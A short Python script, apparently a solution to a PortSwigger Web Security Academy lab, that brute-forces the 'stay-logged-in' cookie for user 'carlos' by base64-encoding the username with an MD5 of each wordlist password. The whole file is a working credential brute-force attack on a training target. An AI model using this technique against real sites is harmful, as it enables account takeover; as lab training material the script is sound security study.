import requests
import base64, hashlib

# stay-logged-in cookie for wiener:peter is d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw
# which is base64 for : wiener:51dc30ddc473d43a6011e9ebba6ca770
# the second part is MD5 for what probably is the password
# Thus, our cookie to bruteforce is base64(carlos:MD5(password))


url = "https://0a8e00e903b0e25080f5492c00ee0054.web-security-academy.net/my-account?id=carlos"


with open("passwords.txt", "r") as f:
    for password in f:
        md5_pass = hashlib.md5(password.strip().encode()).hexdigest()

        cookie = base64.b64encode(f"carlos:{md5_pass}".encode())

        print(f'trying carlos:{password.strip()}')

        cookies = {
            "stay-logged-in" : cookie.decode()
        }
        response = requests.get(url, cookies=cookies)
        if(not b"Not solved" in response.content):
            print(response.content)
            print(password)
            break